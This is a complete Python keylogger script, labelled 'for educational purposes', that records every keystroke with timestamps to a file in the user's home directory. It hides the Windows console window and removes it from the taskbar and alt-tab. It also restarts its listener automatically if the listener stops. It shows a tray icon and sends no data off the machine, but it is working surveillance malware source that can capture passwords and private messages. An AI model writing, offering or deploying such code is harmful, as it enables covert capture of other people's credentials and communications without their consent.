#!/usr/bin/env python3
# A keyboard logger for educational purposes

import os
from pathlib import Path # Import Path
from pynput import keyboard
from datetime import datetime
import threading
import time
import sys
import pystray
from PIL import Image, ImageDraw
import signal

# Get user's home directory
home_dir = Path.home()
# Path to save logs in the home directory
log_file = home_dir / "klog_logs.txt" # Changed filename slightly to avoid potential conflicts

# Global variable to track the timestamp of the last keypress
last_key_time = None
# Inactivity threshold in seconds
INACTIVITY_THRESHOLD = 5
# Global flag for clean shutdown
running = True
# Configuration: Set to False to disable the tray icon
USE_TRAY_ICON = True

# Create a simple tray icon (a filled circle)
def create_icon():
    # Generate a simple icon - a colored circle
    width = 64
    height = 64
    color = (0, 128, 255)  # Blue color
    
    # Create a new image
    image = Image.new('RGB', (width, height), (255, 255, 255, 0))
    dc = ImageDraw.Draw(image)
    
    # Draw a filled circle
    dc.ellipse((10, 10, width-10, height-10), fill=color)
    
    return image

# Function to handle exit from tray icon
def exit_program(icon):
    global running
    icon.visible = False
    icon.stop()
    running = False
    # Signal the main thread to exit
    if listener and listener.is_alive():
        listener.stop()
    # Force exit if needed
    os._exit(0)

# Function to setup system tray
def setup_tray():
    icon = pystray.Icon("keylogger")
    icon.icon = create_icon()
    icon.title = "Keylogger"
    # Add a menu item to exit
    icon.menu = pystray.Menu(
        pystray.MenuItem("Exit", exit_program)
    )
    # Run the icon in a separate thread
    threading.Thread(target=icon.run, daemon=True).start()
    return icon

def append_to_log(key_str, force_timestamp=False):
    """
    Append the key information to the log file with timestamp
    Only add timestamp after inactivity period or when force_timestamp is True (for Enter key)
    """
    global last_key_time
    current_time = datetime.now()
    
    # Check if we should add a timestamp (after inactivity or Enter key)
    add_timestamp = False
    if last_key_time is None:  # First keystroke
        add_timestamp = True
    elif force_timestamp:  # Enter key was pressed
        add_timestamp = True
    elif (current_time - last_key_time).total_seconds() >= INACTIVITY_THRESHOLD:
        add_timestamp = True
    
    # Update the last key time
    last_key_time = current_time

    # Write to log file with or without timestamp
    log_file.parent.mkdir(parents=True, exist_ok=True)
    with open(log_file, "a") as f:
        if add_timestamp:
            timestamp = current_time.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n{timestamp}: {key_str}")
        else:
            f.write(key_str)

def on_press(key):
    """Callback function when a key is pressed"""
    is_enter = False
    
    try:
        # For regular characters
        key_str = key.char
    except AttributeError:
        # For special keys like Shift, Ctrl, etc.
        key_name = str(key).replace("Key.", "")
        key_str = f"<{key_name}>"
        
        # Check if Enter key was pressed
        if key_name == "enter":
            is_enter = True
            key_str = "\\n"  # newline character for Enter
    
    # Force timestamp if Enter is pressed
    append_to_log(key_str, force_timestamp=is_enter)

def hide_console():
    """Makes the console window invisible on Windows by creating a Windows GUI application"""
    try:
        import ctypes
        import win32gui
        import win32con
        
        # Get the console window handle
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            # SW_HIDE (0) to hide the window completely
            ctypes.windll.user32.ShowWindow(whnd, 0)
            
            # Additional step - make the window completely invisible 
            # by removing it from the taskbar and alt+tab
            win32gui.SetWindowLong(whnd, win32con.GWL_EXSTYLE, 
                                  win32gui.GetWindowLong(whnd, win32con.GWL_EXSTYLE) | 
                                  win32con.WS_EX_TOOLWINDOW)
            
            # Ensure it's not in taskbar
            win32gui.ShowWindow(whnd, win32con.SW_HIDE)
    except Exception as e:
        print(f"Failed to hide console: {e}")  # For debugging
        pass  # If it fails, continue anyway

def start_logger():
    """Start the keylogger"""
    # Create the log file if it doesn't exist
    # Ensure the directory exists (though home usually does)
    log_file.parent.mkdir(parents=True, exist_ok=True)
    if not os.path.exists(log_file):
        with open(log_file, "w") as f:
            f.write("=== Keylogger Started ===\n")
    
    # Start the keyboard listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Log when the keylogger starts
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"\n=== Session Started at {timestamp} ===\n")
    
    return listener

if __name__ == "__main__":
    print("Starting keylogger...")
    hide_console()  # Call the hide_console function to make the terminal invisible
    listener = None # Initialize listener to None
    tray_icon = None  # Initialize tray icon to None
    
    try:
        # Setup tray icon if enabled
        if USE_TRAY_ICON:
            tray_icon = setup_tray()
            print("A system tray icon has been created. Right-click it and select 'Exit' to terminate.")
        else:
            print("Tray icon disabled. Use Task Manager to terminate the process.")
        
        # Start the keylogger inside the try block
        listener = start_logger()
        print("Keylogger started successfully!")
        print(f"Logging to: {os.path.abspath(log_file)}")

        # Keep the script running
        while running:
            time.sleep(1)  # Check more frequently
            # Check if listener was successfully created and is still alive
            if listener and not listener.is_alive() and running:
                print("\nListener stopped unexpectedly. Restarting...")
                try:
                    listener = start_logger()
                    print("Listener restarted.")
                except Exception as e:
                    print(f"\nFailed to restart listener: {e}")
                    break  # Exit loop if restart fails
            elif not listener and running:
                print("\nListener failed to start initially.")
                break  # Exit loop if listener never started

    except KeyboardInterrupt:
        # If the user presses Ctrl+C (though unlikely with hidden console)
        print("\nKeylogger stopped by user")
    except Exception as e:
        # Catch any other unexpected errors during the main loop or initial start
        print(f"\nAn error occurred: {e}")
    finally:
        # Ensure the listener is stopped if it exists and is running
        if listener and listener.is_alive():
            print("\nStopping listener...")
            listener.stop()
        # We don't need to keep console open since we're operating via tray now
        print("\nKeylogger terminated.")
